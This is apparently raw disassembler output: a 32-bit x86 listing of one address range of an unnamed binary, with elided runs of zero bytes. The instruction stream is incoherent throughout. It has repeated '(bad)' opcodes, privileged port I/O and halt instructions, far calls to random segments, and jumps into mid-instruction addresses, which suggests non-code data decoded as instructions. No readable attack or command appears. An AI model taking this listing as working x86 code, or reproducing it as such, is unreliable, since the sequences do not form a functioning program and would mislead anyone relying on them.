  41c44f:	and    BYTE PTR [edi-0x74d0b82c],dh
  41c455:	(bad)  [esi-0x73d51a84]
  41c45b:	mov    ah,0x2d
  41c45d:	push   edi
  41c45e:	out    dx,al
  41c45f:	int    0x71
  41c461:	jnp    0x41c45f
  41c463:	sub    al,0x5
  41c465:	mov    eax,ds:0x4ad58e42
  41c46a:	pop    esp
  41c46b:	dec    eax
  41c46c:	ret    
  41c46d:	xor    BYTE PTR [eax],al
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	xor    eax,0x67515069
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    BYTE PTR [eax-0x3043c6be],ch
  41c4f3:	and    BYTE PTR ds:0x43bd0539,bl
  41c4f9:	adc    eax,DWORD PTR [eax+eiz*4-0x405d8318]
  41c500:	xchg   edx,eax
  41c501:	scas   eax,DWORD PTR es:[edi]
  41c502:	push   edi
  41c503:	push   cs
  41c504:	and    edx,DWORD PTR [ebx-0x1ef56820]
  41c50a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c50b:	(bad)  
  41c50c:	xor    BYTE PTR [edi-0x3c15c0bd],bh
  41c512:	aas    
  41c513:	pop    edi
  41c514:	xchg   DWORD PTR [ebp-0x51],ebx
  41c517:	and    DWORD PTR [edi+edi*2],0xffffffe5
  41c51b:	lahf   
  41c51c:	xchg   ecx,eax
  41c51d:	push   cs
  41c51e:	add    al,0x89
  41c520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c521:	stos   BYTE PTR es:[edi],al
  41c522:	aam    0x75
  41c524:	unpcklps xmm5,XMMWORD PTR [edx-0x659d84e9]
  41c52b:	retf   
  41c52c:	test   DWORD PTR [ecx+0x7fce82b9],esi
  41c532:	and    edx,DWORD PTR [ebx-0x5690ca84]
  41c538:	(bad)  
  41c53a:	fisubr DWORD PTR [ebx+0x7a96f7f8]
  41c540:	addr16 push edi
  41c542:	mov    al,ds:0xe90e03
  41c547:	sti    
  41c548:	les    esi,FWORD PTR [edx+0x4d]
  41c54b:	(bad)  
  41c54d:	mov    ds:0xdf4b835a,eax
  41c552:	xor    WORD PTR ds:0xa17b146,0x7d
  41c55a:	inc    ebp
  41c55b:	xchg   BYTE PTR [eax+esi*8-0x19],ch
  41c55f:	xor    BYTE PTR [esi+0x1f4ae284],0xb7
  41c566:	jge    0x41c54b
  41c568:	pop    esp
  41c569:	lock push edi
  41c56b:	add    ecx,0x5b
  41c56e:	les    edx,FWORD PTR [eax+0x4f0567c8]
  41c574:	dec    ecx
  41c575:	mov    ah,BYTE PTR [esi+0x58]
  41c578:	jnp    0x41c50a
  41c57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c57b:	push   0xffffffe6
  41c57d:	(bad)  [edi+0xb]
  41c580:	jo     0x41c58a
  41c582:	xor    eax,0xbe180899
  41c587:	call   DWORD PTR [ebx-0x2a1f5ca0]
  41c58d:	pop    esi
  41c58e:	retf   
  41c58f:	enter  0xb9ee,0xab
  41c593:	sub    DWORD PTR [ebp+0x15],ecx
  41c596:	call   0xb409:0x42fc52cb
  41c59d:	xor    esp,DWORD PTR [ecx]
  41c59f:	xor    al,0xeb
  41c5a1:	xor    bh,ch
  41c5a3:	cmp    BYTE PTR [ecx-0x27],dl
  41c5a6:	icebp  
  41c5a7:	jmp    0x41c5f9
  41c5a9:	jno    0x41c580
  41c5ab:	jbe    0x41c60b
  41c5ad:	mov    gs,WORD PTR [ebx+0x66]
  41c5b0:	stos   DWORD PTR es:[edi],eax
  41c5b1:	mov    al,0xe7
  41c5b3:	inc    edx
  41c5b4:	dec    edx
  41c5b5:	jae    0x41c57c
  41c5b7:	fmulp  st(4),st
  41c5b9:	mov    esi,0xca7affce
  41c5be:	xchg   esp,eax
  41c5bf:	retf   0xd2ad
  41c5c2:	mov    esp,eax
  41c5c4:	lahf   
  41c5c5:	gs mov cl,dh
  41c5c8:	mov    dh,0xba
  41c5ca:	into   
  41c5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5cc:	jo     0x41c596
  41c5ce:	adc    eax,0x4f14bb76
  41c5d3:	add    BYTE PTR [eax+0x130dc34f],dl
  41c5d9:	aad    0xd2
  41c5db:	sbb    eax,0xe78dab04
  41c5e0:	cld    
  41c5e1:	cmp    eax,0xc2705959
  41c5e6:	js     0x41c5a1
  41c5e8:	mov    edx,0xf55c4a48
  41c5ed:	rol    DWORD PTR [eax],cl
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0x43850ab7
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	pop    ecx
  41c66f:	inc    eax
  41c670:	pusha  
  41c671:	outs   dx,BYTE PTR ds:[esi]
  41c672:	sbb    DWORD PTR [eax],edx
  41c674:	outs   dx,BYTE PTR ds:[esi]
  41c675:	lea    ebp,[ebp+ebp*1-0x47]
  41c679:	enter  0x1a6b,0xf1
  41c67d:	dec    ebp
  41c67e:	inc    ebp
  41c67f:	in     al,0x48
  41c681:	xor    eax,0xeed5c526
  41c686:	outs   dx,BYTE PTR ds:[esi]
  41c687:	jmp    0x263067f5
  41c68c:	fsub   st(2),st
  41c68e:	adc    DWORD PTR [esi-0x28],esi
  41c691:	or     ebp,esi
  41c693:	xchg   edx,edx
  41c695:	pop    ebp
  41c696:	or     ebp,edx
  41c698:	fisub  WORD PTR [edx]
  41c69a:	test   esp,esp
  41c69c:	rcr    DWORD PTR [ecx],1
  41c69e:	add    BYTE PTR [ecx-0x2e],0x3
  41c6a2:	in     eax,dx
  41c6a3:	mov    ebx,0x30a3ebe
  41c6a8:	stos   DWORD PTR es:[edi],eax
  41c6a9:	inc    ecx
  41c6aa:	mov    ebx,0x8343650f
  41c6af:	adc    DWORD PTR [esi],eax
  41c6b1:	jge    0x41c6be
  41c6b3:	(bad)  
  41c6b4:	retf   
  41c6b5:	fstp   st(3)
  41c6b7:	add    eax,0xcccc888a
  41c6bc:	ins    DWORD PTR es:[di],dx
  41c6be:	dec    eax
  41c6bf:	cmp    eax,0xc6ed5fb4
  41c6c4:	lahf   
  41c6c5:	and    ebp,ebx
  41c6c7:	xchg   ebp,eax
  41c6c8:	mov    esi,0xb7c2ecdc
  41c6cd:	ja     0x41c68a
  41c6cf:	xor    dl,BYTE PTR [edi-0x20]
  41c6d2:	xor    eax,0xff3873a9
  41c6d7:	xlat   BYTE PTR ds:[ebx]
  41c6d8:	xchg   edx,eax
  41c6d9:	push   0x26
  41c6db:	mov    WORD PTR [ebx-0x67],es
  41c6de:	mov    ds:0x59119bb,eax
  41c6e3:	out    0x35,al
  41c6e5:	jo     0x41c685
  41c6e7:	jnp    0x41c70d
  41c6e9:	pop    edx
  41c6ea:	xor    BYTE PTR [esi+0x65a48ee8],dl
  41c6f0:	leave  
  41c6f1:	scas   eax,DWORD PTR es:[edi]
  41c6f2:	push   0x71
  41c6f4:	xchg   esi,eax
  41c6f5:	fild   QWORD PTR [esi-0x2491d031]
  41c6fb:	pop    DWORD PTR [ebx+edx*8+0x74e8331]
  41c702:	push   es
  41c703:	lock mov cl,0xe3
  41c706:	dec    edx
  41c707:	aad    0xb3
  41c709:	push   ebx
  41c70a:	sahf   
  41c70b:	mov    ecx,0x2a0d86bd
  41c710:	outs   dx,BYTE PTR ds:[esi]
  41c711:	fsubr  DWORD PTR [esi+0x4536c7b9]
  41c717:	cmp    DWORD PTR [edi+0x81c7410],ebx
  41c71d:	pusha  
  41c71e:	push   esp
  41c71f:	cmp    al,BYTE PTR [ecx-0xc]
  41c722:	stos   DWORD PTR es:[edi],eax
  41c723:	mov    ds:0xf024517,al
  41c728:	pushf  
  41c729:	ss enter 0xb2c1,0xdf
  41c72e:	jmp    0x91a792d6
  41c733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c734:	jp     0x41c708
  41c736:	shr    DWORD PTR [ebp+0x1a2f42ad],1
  41c73c:	ins    DWORD PTR es:[edi],dx
  41c73d:	dec    esi
  41c73e:	mov    bl,0x12
  41c740:	rol    DWORD PTR [ecx-0x20a89d2],0x16
  41c747:	mov    WORD PTR [ebx-0x5056e4cf],gs
  41c74d:	dec    esi
  41c74e:	push   cs
  41c74f:	les    eax,FWORD PTR [ecx+0x54]
  41c752:	jb     0x41c7bd
  41c754:	in     al,dx
  41c755:	fbld   TBYTE PTR [ebp+0x31]
  41c758:	outs   dx,BYTE PTR ds:[esi]
  41c759:	fbstp  TBYTE PTR [ebx-0x3eaa143d]
  41c75f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c760:	stos   DWORD PTR es:[edi],eax
  41c761:	dec    esi
  41c762:	xor    al,BYTE PTR [ebx+ecx*1+0x2c621f66]
  41c769:	fstp   QWORD PTR [edx+ebx*4-0x79]
  41c76d:	jp     0x41c76f
	...
  41c7d3:	add    BYTE PTR [eax],al
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	mov    BYTE PTR [eax],dh
  41c7e4:	out    dx,eax
  41c7e5:	imul   esp,DWORD PTR [edi+0x32],0x1000001
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	mov    dh,0xf0
  41c7f0:	neg    BYTE PTR [edx-0x29b8d281]
  41c7f6:	push   cs
  41c7f7:	and    BYTE PTR [esi-0x67],al
  41c7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7fb:	add    BYTE PTR [edx+ebx*1-0x3a],ch
  41c7ff:	das    
  41c800:	icebp  
  41c801:	jp     0x41c7b2
  41c803:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c805:	mov    ecx,0x66097802
  41c80a:	retf   
  41c80b:	pusha  
  41c80c:	cli    
  41c80d:	pusha  
  41c80e:	rol    BYTE PTR [ebp-0x4603db54],cl
  41c814:	imul   esi,DWORD PTR [eax-0x67878a04],0xc1a73474
  41c81e:	and    ebx,ecx
  41c820:	cmp    BYTE PTR [eax+ecx*4-0x4a063e36],0x7e
  41c828:	fisubr WORD PTR [ebp-0x4b]
  41c82b:	sahf   
  41c82c:	in     eax,dx
  41c82d:	out    0x63,al
  41c82f:	mov    ds:0xcd4f6b5c,al
  41c834:	mov    ds,eax
  41c836:	sbb    eax,0x47c49784
  41c83b:	cmp    cl,BYTE PTR [esi-0x18]
  41c83e:	mov    ah,bl
  41c840:	ja     0x41c865
  41c842:	cmp    dl,BYTE PTR [ebp+0xc]
  41c845:	sahf   
  41c846:	sub    DWORD PTR [esp+edx*4-0x6d8fd465],0x11
  41c84e:	push   ecx
  41c84f:	push   ss
  41c850:	cmc    
  41c851:	aad    0xd6
  41c853:	out    0x68,eax
  41c855:	push   ecx
  41c856:	xor    edi,ecx
  41c858:	hlt    
  41c859:	in     eax,dx
  41c85a:	fdivr  st,st(1)
  41c85c:	je     0x41c7de
  41c85e:	mov    ah,0x62
  41c860:	test   BYTE PTR [ecx+0x311c203f],cl
  41c866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c867:	sub    eax,0x6acc784d
  41c86c:	out    0xad,al
  41c86e:	(bad)  
  41c86f:	jnp    0x41c867
  41c871:	jnp    0x41c854
  41c873:	clc    
  41c874:	mov    ch,0xa7
  41c876:	aam    0x39
  41c878:	aas    
  41c879:	nop
  41c87a:	addr16 adc al,0x91
  41c87d:	(bad)  
  41c87e:	out    0xd2,al
  41c880:	or     al,BYTE PTR [ebp+0x16b809c7]
  41c886:	js     0x41c877
  41c888:	push   es
  41c889:	ins    DWORD PTR es:[edi],dx
  41c88a:	not    BYTE PTR [eax-0x70f700b4]
  41c890:	psubusw mm1,mm0
  41c893:	or     eax,0xd8ed0303
  41c898:	fistp  DWORD PTR [ebp+0x7d]
  41c89b:	sbb    al,0xa0
  41c89d:	(bad)  
  41c89e:	arpl   WORD PTR [edx+ebx*1+0x4db2d86d],si
  41c8a5:	imul   esi,DWORD PTR [ebp-0x7ecd32b3],0x39
  41c8ac:	xchg   edi,eax
  41c8ad:	icebp  
  41c8ae:	dec    ebp
  41c8af:	sbb    BYTE PTR [edi],dl
  41c8b1:	xchg   ebx,eax
  41c8b2:	mov    WORD PTR [esi-0x29],?
  41c8b5:	sub    eax,0x65f25511
  41c8ba:	jae    0x41c8d6
  41c8bc:	cmp    BYTE PTR [edx+ecx*8-0x4],0xe9
  41c8c1:	xchg   edx,eax
  41c8c2:	fcom   DWORD PTR [ecx]
  41c8c4:	fst    st(7)
  41c8c6:	dec    edi
  41c8c7:	pop    ebp
  41c8c8:	and    eax,0xdc1b840b
  41c8cd:	add    BYTE PTR [ebp-0x1d],bl
  41c8d0:	imul   edx,esp,0x9dae0b47
  41c8d6:	or     eax,0x8fa644e2
  41c8db:	adc    esi,DWORD PTR [ebx]
  41c8dd:	jne    0x41c8b9
  41c8df:	out    dx,al
  41c8e0:	iret   
  41c8e1:	arpl   bx,di
  41c8e3:	aas    
  41c8e4:	out    0xd5,eax
  41c8e6:	pop    edi
  41c8e7:	mov    cl,0xed
  41c8e9:	adc    eax,0xba0aeb10
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    DWORD PTR [esi+0x7c],edi
  41c964:	xor    bh,dh
  41c966:	xor    eax,DWORD PTR [bx+di]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    BYTE PTR [edi+0x3a8f5639],bl
  41c973:	out    dx,al
  41c974:	and    al,0x36
  41c976:	mov    esp,0xf780ec6d
  41c97b:	cmp    eax,0xd500fc1f
  41c980:	loope  0x41c926
  41c982:	adc    eax,0x22724e88
  41c987:	js     0x41c960
  41c989:	ret    
  41c98a:	fdiv   DWORD PTR [ecx-0x2cb35b93]
  41c990:	arpl   WORD PTR [edi],sp
  41c992:	in     al,dx
  41c993:	pusha  
  41c994:	mov    WORD PTR [edi-0x4b4dfa82],?
  41c99a:	adc    bh,bl
  41c99c:	nop
  41c99d:	pop    eax
  41c99e:	mov    ds,WORD PTR [esi+0xa]
  41c9a1:	fmul   DWORD PTR [esi]
  41c9a3:	jb     0x41c93e
  41c9a5:	mov    edi,0x25f52cfe
  41c9aa:	mov    eax,0xde6504b
  41c9af:	mov    WORD PTR [edi],ss
  41c9b1:	adc    edi,esp
  41c9b3:	jmp    0xb865:0x71466004
  41c9ba:	xchg   ebx,eax
  41c9bb:	push   ebp
  41c9bd:	test   eax,0xbf3681da
  41c9c2:	mov    cs,WORD PTR [edx-0x1a]
  41c9c5:	call   0x3b287597
  41c9ca:	pop    esp
  41c9cb:	xchg   ebp,eax
  41c9cc:	popa   
  41c9cd:	mov    ebp,0x15b44a0c
  41c9d2:	jno    0x41ca0c
  41c9d4:	and    BYTE PTR [edx],dl
  41c9d6:	icebp  
  41c9d7:	push   esi
  41c9d8:	xchg   ecx,eax
  41c9d9:	repz add BYTE PTR [edx-0xf4a6de2],al
  41c9e0:	mov    ecx,0x9f6c7e94
  41c9e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e6:	jnp    0x41c9df
  41c9e8:	cmp    ebp,edi
  41c9ea:	fsubr  QWORD PTR [esi-0x1740d0a8]
  41c9f0:	jbe    0x41c9a4
  41c9f2:	in     al,dx
  41c9f3:	mov    al,ds:0x26009d93
  41c9f8:	and    edi,esp
  41c9fa:	arpl   ax,bp
  41c9fc:	jecxz  0x41c987
  41c9fe:	ins    DWORD PTR es:[edi],dx
  41c9ff:	call   0xc682:0x4500bac5
  41ca06:	jecxz  0x41c9fb
  41ca08:	mov    esp,0x757a15ca
  41ca0d:	ror    DWORD PTR [edx],cl
  41ca0f:	xchg   esp,eax
  41ca10:	addr16 adc esp,ebp
  41ca13:	mov    dh,0x6c
  41ca15:	inc    ecx
  41ca16:	in     al,0xe3
  41ca18:	out    0x83,al
  41ca1a:	xor    esp,DWORD PTR [ecx]
  41ca1c:	add    eax,0xf8f95eb2
  41ca21:	mov    eax,ds:0x799a7fb9
  41ca26:	fsub   QWORD PTR [esi-0x7c386648]
  41ca2c:	xchg   ecx,eax
  41ca2d:	pusha  
  41ca2e:	jo     0x41ca8d
  41ca30:	xchg   ebx,eax
  41ca31:	shl    BYTE PTR [edi+0x15],1
  41ca34:	inc    eax
  41ca35:	fnsetpm(287 only) 
  41ca37:	inc    ecx
  41ca38:	punpcklbw mm6,DWORD PTR [esp+ebp*8]
  41ca3c:	push   ds
  41ca3d:	xor    DWORD PTR [ecx],edx
  41ca3f:	dec    eax
  41ca40:	sub    dl,0x9f
  41ca43:	imul   ebp,DWORD PTR [esi],0xe46c2bea
  41ca49:	ret    0x5895
  41ca4c:	leave  
  41ca4d:	xlat   BYTE PTR ds:[ebx]
  41ca4e:	xor    al,0xb9
  41ca50:	(bad)  
  41ca51:	mov    esp,0x9226fbc0
  41ca56:	retf   0x5ef1
  41ca59:	mov    edi,ss
  41ca5b:	daa    
  41ca5c:	jnp    0x41ca92
  41ca5e:	mov    ch,0x19
  41ca60:	push   ds
  41ca61:	mov    dh,0xa4
  41ca63:	mov    BYTE PTR ds:0xbf5ea349,ah
  41ca69:	int3   
  41ca6a:	call   0x0:0xd0aff9
	...
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	ja     0x41cb09
  41cae4:	sbb    al,0xe9
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    BYTE PTR [esi],dl
  41caef:	push   eax
  41caf0:	lds    ebp,FWORD PTR [ebx-0x2e1ba0f5]
  41caf6:	xchg   esp,ebx
  41caf8:	call   0xcb2d0edd
  41cafd:	call   DWORD PTR [ecx-0x7f573aad]
  41cb03:	in     eax,dx
  41cb04:	add    DWORD PTR [ecx],ecx
  41cb06:	ror    cl,0x1
  41cb09:	out    0x7a,eax
  41cb0b:	jl     0x41cb01
  41cb0d:	neg    DWORD PTR [ebx-0xe]
  41cb10:	pusha  
  41cb11:	test   ecx,ebx
  41cb13:	and    ch,BYTE PTR [ebx+0x7bee8a54]
  41cb19:	mov    ebx,0x8d507462
  41cb1e:	fwait
  41cb1f:	je     0x41cb0f
  41cb21:	enter  0x279a,0xa4
  41cb25:	pop    ss
  41cb26:	js     0x41caf5
  41cb28:	dec    DWORD PTR [ecx+0x631e3c24]
  41cb2e:	push   ss
  41cb2f:	scas   eax,DWORD PTR es:[edi]
  41cb30:	loope  0x41cb2a
  41cb32:	adc    esp,esi
  41cb34:	(bad)  
  41cb36:	fnstcw WORD PTR [esi]
  41cb38:	add    al,0xbe
  41cb3a:	es add edx,edx
  41cb3d:	xor    esi,DWORD PTR ds:0xc1642ef6
  41cb43:	xor    ah,al
  41cb45:	out    dx,eax
  41cb46:	in     eax,0xd2
  41cb48:	mov    ecx,DWORD PTR ds:0x266c07e0
  41cb4e:	js     0x41cb60
  41cb50:	jl     0x41cb57
  41cb52:	sub    al,0x51
  41cb54:	arpl   WORD PTR [edi+0x60],sp
  41cb57:	sbb    BYTE PTR [ecx-0x58],0xc0
  41cb5b:	in     al,0x30
  41cb5d:	pop    esi
  41cb5e:	cmp    BYTE PTR [ebp-0x71d1a0a2],dh
  41cb64:	out    0xe,eax
  41cb66:	fdiv   DWORD PTR [edx-0xe]
  41cb69:	sbb    edi,edi
  41cb6b:	fwait
  41cb6c:	loop   0x41cb7c
  41cb6e:	dec    edx
  41cb6f:	pop    ds
  41cb70:	adc    ch,BYTE PTR [eax+ecx*2+0x5cf34805]
  41cb77:	(bad)  
  41cb78:	mov    edx,0xe1e6b4d8
  41cb7d:	jmp    0x4e2f:0x6e4d5fb1
  41cb84:	push   edi
  41cb85:	lock mov ebx,0xac2f359
  41cb8b:	mov    ebx,0x7c18caaf
  41cb90:	push   0xc474b828
  41cb95:	sahf   
  41cb96:	or     eax,0x3093e28b
  41cb9b:	xchg   ecx,eax
  41cb9c:	xchg   edi,esi
  41cb9e:	hlt    
  41cb9f:	push   ecx
  41cba0:	sbb    eax,0xdb9c532f
  41cba5:	fcom   QWORD PTR [ecx+0x2]
  41cba8:	dec    ecx
  41cba9:	or     eax,0xe157aa27
  41cbae:	loopne 0x41cba9
  41cbb0:	(bad)  
  41cbb1:	repz and ecx,0xf9bac22
  41cbb8:	cmp    ah,BYTE PTR [esi-0x6]
  41cbbb:	jmp    0x41cc31
  41cbbd:	das    
  41cbbe:	mov    fs,WORD PTR [edi+0xa9d7585]
  41cbc4:	adc    al,0x38
  41cbc6:	push   ax
  41cbc8:	test   BYTE PTR [edx+0x5c2f710c],dl
  41cbce:	test   BYTE PTR [eax+ebx*4],bl
  41cbd1:	jbe    0x41cc23
  41cbd3:	push   edx
  41cbd4:	adc    cl,al
  41cbd6:	pop    eax
  41cbd7:	mov    ds:0x699c15f2,eax
  41cbdc:	ds aad 0x5d
  41cbdf:	inc    ebx
  41cbe0:	mov    al,cl
  41cbe2:	inc    ebp
  41cbe3:	adc    ah,cl
  41cbe5:	or     BYTE PTR [esi+0x67],0x70
  41cbe9:	mov    eax,0xea75ba57
	...
  41cc56:	sub    esi,edx
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0xf5535b22
  41cc65:	inc    edx
  41cc66:	addr16 xor eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	adc    bl,ch
  41cc70:	jne    0x41cc91
  41cc72:	daa    
  41cc73:	and    al,ch
  41cc75:	cwde   
  41cc76:	sub    DWORD PTR [edx-0x7965c969],0xd2f11e3a
  41cc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc81:	inc    ebx
  41cc82:	(bad)  
  41cc84:	add    esi,esp
  41cc86:	or     edx,DWORD PTR [ebx+0x4e]
  41cc89:	jmp    DWORD PTR [edx-0x162171cb]
  41cc8f:	cdq    
  41cc90:	xor    al,0x80
  41cc92:	xor    edx,DWORD PTR [ecx-0x585682fb]
  41cc98:	mov    ah,0x40
  41cc9a:	mov    dl,0x9c
  41cc9c:	rcr    ebp,0x58
  41cc9f:	mov    edi,0x63d510ab
  41cca4:	adc    al,0x48
  41cca6:	dec    ebp
  41cca7:	clc    
  41cca8:	pop    esi
  41cca9:	inc    esp
  41ccaa:	mov    ebx,0x126f70ea
  41ccaf:	or     BYTE PTR [ebp+0x85bf451],al
  41ccb5:	add    dh,bl
  41ccb7:	neg    DWORD PTR [edi-0x27b876a4]
  41ccbd:	jl     0x41cce8
  41ccbf:	icebp  
  41ccc0:	int3   
  41ccc1:	pop    edx
  41ccc2:	outs   dx,DWORD PTR ds:[esi]
  41ccc3:	div    edx
  41ccc5:	cwde   
  41ccc6:	add    cl,BYTE PTR [ebp+0x3b50e6ac]
  41cccc:	popf   
  41cccd:	pop    esp
  41ccce:	jo     0x41ccae
  41ccd0:	push   edx
  41ccd1:	xlat   BYTE PTR ds:[ebx]
  41ccd2:	jae    0x41cd3b
  41ccd4:	pop    es
  41ccd5:	pop    edx
  41ccd6:	cmc    
  41ccd7:	xchg   edx,eax
  41ccd8:	sbb    DWORD PTR [edi],esp
  41ccda:	aam    0x75
  41ccdc:	lock inc esi
  41ccde:	add    ebp,ecx
  41cce0:	push   ecx
  41cce1:	mov    DWORD PTR [ebx+eiz*8+0x3e],edx
  41cce5:	(bad)  
  41cce6:	fwait
  41cce7:	dec    edi
  41cce8:	sbb    eax,DWORD PTR [edi-0x21]
  41cceb:	xlat   BYTE PTR ds:[ebx]
  41ccec:	and    al,0x76
  41ccee:	int3   
  41ccef:	test   DWORD PTR [ecx],ecx
  41ccf1:	push   esi
  41ccf2:	mov    ah,0x77
  41ccf4:	in     eax,0x96
  41ccf6:	pop    ss
  41ccf7:	stc    
  41ccf8:	mov    BYTE PTR es:[ecx+0x5b],cl
  41ccfc:	xchg   dh,bh
  41ccfe:	imul   ebp,DWORD PTR [edi-0x52],0x21d1c5f9
  41cd05:	fcomp  st(3)
  41cd07:	ror    BYTE PTR [ebp+0x781dc3ac],1
  41cd0d:	xchg   esp,eax
  41cd0e:	push   0x36ea0bb2
  41cd13:	(bad)  
  41cd14:	jmp    0x41cd5c
  41cd16:	adc    al,0xab
  41cd18:	lea    ebx,[edi+ebx*2-0x34ebe500]
  41cd1f:	js     0x41cd3d
  41cd21:	push   edi
  41cd22:	and    eax,0x3d974f95
  41cd27:	mov    esp,DWORD PTR [eax-0x46]
  41cd2a:	add    eax,0x99e02aa
  41cd2f:	adc    esp,DWORD PTR [edx+0x721475ba]
  41cd35:	sub    dh,0xe
  41cd38:	xchg   edi,eax
  41cd39:	cmp    cl,0x8a
  41cd3c:	push   eax
  41cd3d:	push   es
  41cd3e:	sbb    al,al
  41cd40:	sti    
  41cd41:	int    0x74
  41cd43:	dec    esp
  41cd44:	es icebp 
  41cd46:	or     dh,BYTE PTR [ecx]
  41cd48:	repz js 0x41cd4e
  41cd4b:	leave  
  41cd4c:	dec    ebx
  41cd4d:	repz out dx,eax
  41cd4f:	shr    cl,1
  41cd51:	sbb    al,0x22
  41cd53:	jle    0x41cdb8
  41cd55:	les    ebx,FWORD PTR [esp+ecx*2+0x64097bb0]
  41cd5c:	leave  
  41cd5d:	dec    edx
  41cd5e:	in     eax,0xb6
  41cd60:	std    
  41cd61:	mov    esp,DWORD PTR [ebx-0x3644354f]
  41cd67:	setge  BYTE PTR [ebx]
  41cd6a:	js     0x41cdbd
  41cd6c:	in     al,dx
  41cd6d:	sub    BYTE PTR [eax],al
	...
  41cdd3:	add    BYTE PTR [eax],al
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	mov    sp,ds
  41cde5:	cmp    eax,0x13667
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	inc    BYTE PTR [esi+edx*2+0x2b]
  41cdf2:	fild   QWORD PTR [edi-0x18]
  41cdf5:	mov    esp,DWORD PTR ss:[esi+0x557cb2e0]
  41cdfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdfd:	call   DWORD PTR [ebp+0x5c2f238f]
  41ce03:	stos   BYTE PTR es:[edi],al
  41ce04:	jg     0x41cde2
  41ce06:	dec    ecx
  41ce07:	repz aad 0x45
  41ce0a:	ret    0x1156
  41ce0d:	mov    WORD PTR [ecx],bp
  41ce10:	pop    ds
  41ce11:	jle    0x41cdc1
  41ce13:	(bad)  
  41ce14:	(bad)  [edi-0x36]
  41ce17:	jmp    0x41cdaa
  41ce19:	cmp    eax,0x21d431d6
  41ce1e:	call   0x9592:0x5723bc98
  41ce25:	dec    ebx
  41ce26:	mov    eax,ds:0x8ebdd5ed
  41ce2b:	inc    edx
  41ce2c:	jl     0x41cdbf
  41ce2e:	pop    ebx
  41ce2f:	or     BYTE PTR [edi-0x71],al
  41ce32:	or     eax,0x7277b061
  41ce37:	xchg   edx,eax
  41ce38:	push   ebp
  41ce39:	lods   eax,DWORD PTR ds:[esi]
  41ce3a:	dec    edi
  41ce3b:	push   esp
  41ce3c:	sbb    al,0x43
  41ce3e:	ja     0x41cdff
  41ce40:	sub    dh,BYTE PTR [ecx]
  41ce42:	repnz out 0xae,eax
  41ce45:	cmp    ecx,DWORD PTR [edi+edi*2+0x4a37873b]
  41ce4c:	test   al,0x0
  41ce4e:	shl    DWORD PTR [esi],1
  41ce50:	outs   dx,DWORD PTR ds:[esi]
  41ce51:	mov    cl,0xdd
  41ce53:	mov    bl,0x79
  41ce55:	mov    ds:0x95e0907e,eax
  41ce5a:	in     eax,0x65
  41ce5c:	jbe    0x41ce50
  41ce5e:	and    bl,bh
  41ce60:	pop    ebp
  41ce61:	sbb    eax,0x38e68fa3
  41ce66:	sbb    BYTE PTR [ecx+0x4d],ch
  41ce69:	dec    eax
  41ce6a:	lock push edx
  41ce6c:	into   
  41ce6d:	retf   0x2017
  41ce70:	fs sbb al,0xdf
  41ce73:	out    dx,eax
  41ce74:	mov    al,0xb8
  41ce76:	push   es
  41ce77:	sti    
  41ce78:	or     dh,BYTE PTR [ecx+ebp*8+0x23]
  41ce7c:	pop    ds
  41ce7d:	pop    ecx
  41ce7e:	cmp    BYTE PTR [ecx-0x61bdfd3a],al
  41ce84:	adc    eax,0xc095ee2a
  41ce89:	pop    ecx
  41ce8a:	lock sub esi,DWORD PTR [edx+0x4aa35350]
  41ce91:	shr    DWORD PTR [esi-0x4a6a0c07],1
  41ce97:	cld    
  41ce98:	rcr    BYTE PTR [ecx],cl
  41ce9a:	jae    0x41ced6
  41ce9c:	ins    DWORD PTR es:[edi],dx
  41ce9d:	enter  0xe09a,0x3b
